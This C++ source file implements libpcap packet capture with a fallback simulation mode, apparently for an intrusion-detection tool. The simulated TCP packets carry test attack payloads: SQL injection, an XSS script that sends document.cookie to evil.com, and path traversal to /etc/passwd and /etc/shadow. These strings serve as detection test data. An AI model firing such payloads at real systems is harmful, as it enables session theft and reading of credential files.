/**
 * @file packet_capture.cpp
 * @brief Implementation of packet capture functionality
 */

#include "packet_capture.h"
#include <stdexcept>
#include <iostream>
#include <fstream>
#include <thread>
#include <functional>
#include <cstring>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

// Structure to pass data to callback
struct CallbackData {
    PacketCapture* capture;
    PacketCapture::PacketCallback callback;
};

PacketCapture::PacketCapture(const std::string& device, bool promiscuous, 
                           int snaplen, int timeoutMs)
    : m_device(device), m_promiscuous(promiscuous), 
      m_snaplen(snaplen), m_timeoutMs(timeoutMs),
      m_pcapHandle(nullptr), m_running(false), m_simulationMode(false) {
    
    std::cout << "Packet capture created for device: " << device << std::endl;
}

PacketCapture::~PacketCapture() {
    if (m_running) {
        stopCapture();
    }
    
    if (m_pcapHandle) {
        pcap_close(m_pcapHandle);
        m_pcapHandle = nullptr;
    }
}

// Helper method to create a simulated packet for development
void PacketCapture::createSimulatedTraffic(uint8_t* buffer, int& length, int packetType) {
    // Create a simple dummy packet with recognizable pattern
    memset(buffer, 0, 1024);  // Clear buffer
    
    // Create a simple header at the beginning
    const char* header = "SIMULATED PACKET";
    memcpy(buffer, header, strlen(header));
    
    // Add packet type information
    const char* typeStr = "";
    switch (packetType) {
        case 0:
            typeStr = " TYPE=TCP SRC=192.168.1.10:12345 DST=10.0.0.1:80 FLAGS=SYN";
            break;
        case 1:
            typeStr = " TYPE=UDP SRC=192.168.1.10:53 DST=10.0.0.1:12345";
            break;
        case 2:
            typeStr = " TYPE=ICMP SRC=192.168.1.10 DST=10.0.0.1 TYPE=ECHO";
            break;
    }
    
    memcpy(buffer + strlen(header), typeStr, strlen(typeStr));
    
    // Add payload based on type
    const char* payload = "";
    switch (packetType) {
        case 0:
            // Alternate between SQL injection, XSS, and path traversal payloads
            static int payloadType = 0;
            if (payloadType == 0) {
                payload = " PAYLOAD=GET /login.php?username=admin' OR 1=1; -- &password=test HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin' OR 1=1; SELECT * FROM users; --&password=test";
            } else if (payloadType == 1) {
                payload = " PAYLOAD=GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ncomment=<img src=x onerror=alert(1)>&search=<script>fetch('https://evil.com?cookie='+document.cookie)</script>";
            } else {
                payload = " PAYLOAD=GET /images/../../../../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\npath=../../../etc/shadow&file=/var/www/html/../../../../etc/passwd";
            }
            payloadType = (payloadType + 1) % 3;
            break;
        case 1:
            payload = " PAYLOAD=UDP-DATA";
            break;
        case 2:
            payload = " PAYLOAD=PING";
            break;
    }
    
    memcpy(buffer + strlen(header) + strlen(typeStr), payload, strlen(payload));
    
    // Set the total length
    length = strlen(header) + strlen(typeStr) + strlen(payload);
    
    // For debugging
    std::cout << "Created simulated " 
              << (packetType == 0 ? "TCP" : packetType == 1 ? "UDP" : "ICMP") 
              << " packet, length: " << length << std::endl;
}

bool PacketCapture::initialize() {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    
    std::cout << "Initializing packet capture on device: " << m_device << std::endl;
    
    // First, let's find all available devices
    pcap_if_t *alldevs;
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        m_lastError = std::string("Error finding devices: ") + errbuf;
        std::cerr << m_lastError << std::endl;
        // Continue with specified device anyway
    } else {
        bool found = false;
        std::cout << "Available network interfaces:" << std::endl;
        for (pcap_if_t *d = alldevs; d != nullptr; d = d->next) {
            std::cout << "  " << d->name;
            if (d->description) {
                std::cout << " (" << d->description << ")";
            }
            std::cout << std::endl;
            
            if (m_device == d->name) {
                found = true;
            }
        }
        
        if (!found && alldevs) {
            std::cout << "Warning: Device " << m_device << " not found in list." << std::endl;
            if (alldevs) {
                std::cout << "Using the first available device: " << alldevs->name << std::endl;
                m_device = alldevs->name;
            }
        }
        
        pcap_freealldevs(alldevs);
    }
    
    // Open the device for live capture
    m_pcapHandle = pcap_open_live(
        m_device.c_str(),   // device
        m_snaplen,          // snaplen
        m_promiscuous ? 1 : 0, // promiscuous mode
        m_timeoutMs,        // timeout
        errbuf              // error buffer
    );
    
    if (m_pcapHandle == nullptr) {
        m_lastError = std::string("Failed to open device ") + m_device + ": " + errbuf;
        std::cerr << m_lastError << std::endl;
        
        // If we fail, try to open in non-promiscuous mode
        if (m_promiscuous) {
            std::cout << "Trying non-promiscuous mode..." << std::endl;
            m_promiscuous = false;
            m_pcapHandle = pcap_open_live(
                m_device.c_str(),
                m_snaplen,
                0, // non-promiscuous
                m_timeoutMs,
                errbuf
            );
            
            if (m_pcapHandle == nullptr) {
                m_lastError = std::string("Still failed to open device in non-promiscuous mode: ") + errbuf;
                std::cerr << m_lastError << std::endl;
                
                // Try "any" interface
                std::cout << "Trying 'any' interface..." << std::endl;
                m_device = "any";
                m_pcapHandle = pcap_open_live(
                    m_device.c_str(),
                    m_snaplen,
                    0,
                    m_timeoutMs,
                    errbuf
                );
                
                if (m_pcapHandle == nullptr) {
                    m_lastError = std::string("Failed to open 'any' interface: ") + errbuf;
                    std::cerr << m_lastError << std::endl;
                    
                    // Fall back to simulation mode for development environments
                    std::cout << "Falling back to simulation mode" << std::endl;
                    m_simulationMode = true;
                    return true; // Return success - we'll simulate packets
                }
            }
        } else {
            // Try "any" interface in non-promiscuous mode
            std::cout << "Trying 'any' interface in non-promiscuous mode..." << std::endl;
            m_device = "any";
            m_pcapHandle = pcap_open_live(
                m_device.c_str(),
                m_snaplen,
                0,
                m_timeoutMs,
                errbuf
            );
            
            if (m_pcapHandle == nullptr) {
                m_lastError = std::string("Failed to open 'any' interface: ") + errbuf;
                std::cerr << m_lastError << std::endl;
                
                // Fall back to simulation mode
                std::cout << "Falling back to simulation mode" << std::endl;
                m_simulationMode = true;
                return true; // Return success - we'll simulate packets
            }
        }
    }
    
    // If we're not in simulation mode, check the data link type
    if (!m_simulationMode) {
        // Check if the device provides Ethernet headers
        int datalink = pcap_datalink(m_pcapHandle);
        if (datalink != DLT_EN10MB) {
            m_lastError = "Device " + m_device + " doesn't provide Ethernet headers - not supported (datalink type: " + 
                         std::to_string(datalink) + ")";
            std::cerr << m_lastError << std::endl;
            
            // Close the handle and fall back to simulation
            pcap_close(m_pcapHandle);
            m_pcapHandle = nullptr;
            
            std::cout << "Falling back to simulation mode due to non-ethernet headers" << std::endl;
            m_simulationMode = true;
            return true; // Return success - we'll simulate packets
        }
        
        std::cout << "Packet capture initialized successfully on " << m_device << std::endl;
    }
    
    return true;
}

bool PacketCapture::setFilter(const std::string& filterExpr) {
    // In simulation mode, we'll just pretend to set the filter
    if (m_simulationMode) {
        std::cout << "In simulation mode, filter '" << filterExpr << "' accepted" << std::endl;
        return true;
    }
    
    if (!m_pcapHandle) {
        m_lastError = "Packet capture not initialized";
        return false;
    }
    
    struct bpf_program filter;
    bpf_u_int32 netmask = 0;
    bpf_u_int32 ip = 0;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    
    // Get netmask for the device
    if (pcap_lookupnet(m_device.c_str(), &ip, &netmask, errbuf) == -1) {
        netmask = 0;
        m_lastError = std::string("Warning: ") + errbuf + " - using default netmask";
        // Continue despite warning
    }
    
    // Compile the filter expression
    if (pcap_compile(m_pcapHandle, &filter, filterExpr.c_str(), 0, netmask) == -1) {
        m_lastError = std::string("Error compiling filter '") + filterExpr + "': " + 
                    pcap_geterr(m_pcapHandle);
        return false;
    }
    
    // Set the filter
    if (pcap_setfilter(m_pcapHandle, &filter) == -1) {
        m_lastError = std::string("Error setting filter: ") + pcap_geterr(m_pcapHandle);
        pcap_freecode(&filter);
        return false;
    }
    
    pcap_freecode(&filter);
    return true;
}

bool PacketCapture::startCapture(PacketCallback callback) {
    if (m_running) {
        m_lastError = "Packet capture already running";
        return false;
    }
    
    m_running = true;
    
    if (m_simulationMode) {
        std::cout << "Starting packet capture in simulation mode" << std::endl;
        // Create a thread for simulated packets
        std::thread simThread(&PacketCapture::simulationThread, this, callback);
        simThread.detach();
    } else {
        if (!m_pcapHandle) {
            m_lastError = "Packet capture not initialized";
            m_running = false;
            return false;
        }
        
        // Create a thread to run the capture loop
        std::thread captureThread(&PacketCapture::captureThread, this, callback);
        captureThread.detach();
    }
    
    return true;
}

void PacketCapture::captureThread(PacketCallback callback) {
    if (!m_pcapHandle || !callback) {
        m_running = false;
        return;
    }
    
    // Create callback data structure
    CallbackData* data = new CallbackData{this, callback};
    
    // Start capturing packets
    pcap_loop(m_pcapHandle, 0, &PacketCapture::packetHandler, reinterpret_cast<u_char*>(data));
    
    // Clean up
    delete data;
    m_running = false;
}

void PacketCapture::packetHandler(u_char* userData, const struct pcap_pkthdr* header, const u_char* packet) {
    CallbackData* data = reinterpret_cast<CallbackData*>(userData);
    
    if (data && data->capture && data->capture->m_running && data->callback) {
        // Call the user-provided callback
        data->callback(packet, header);
    }
}

void PacketCapture::simulationThread(PacketCallback callback) {
    if (!callback) {
        m_running = false;
        return;
    }
    
    std::cout << "Simulation thread started, generating test traffic..." << std::endl;
    
    // Buffers for packet data and header
    uint8_t packetBuffer[2048];
    struct pcap_pkthdr header;
    
    // Set up the header
    gettimeofday(&header.ts, nullptr);
    
    int packetType = 0;  // Start with TCP
    
    // Generate packets while running
    while (m_running) {
        // Create a packet
        int packetLength = 0;
        createSimulatedTraffic(packetBuffer, packetLength, packetType);
        
        // Update header with packet info
        header.caplen = packetLength;
        header.len = packetLength;
        gettimeofday(&header.ts, nullptr); // Update timestamp
        
        // Call the callback with the simulated packet
        callback(packetBuffer, &header);
        
        // Rotate through packet types (TCP, UDP, ICMP)
        packetType = (packetType + 1) % 3;
        
        // Sleep to simulate natural packet timing
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
    std::cout << "Simulation thread stopped" << std::endl;
}

void PacketCapture::stopCapture() {
    if (m_running) {
        if (m_pcapHandle && !m_simulationMode) {
            pcap_breakloop(m_pcapHandle);
        }
        m_running = false;
    }
}

bool PacketCapture::isRunning() const {
    return m_running;
}

std::string PacketCapture::getLastError() const {
    return m_lastError;
}
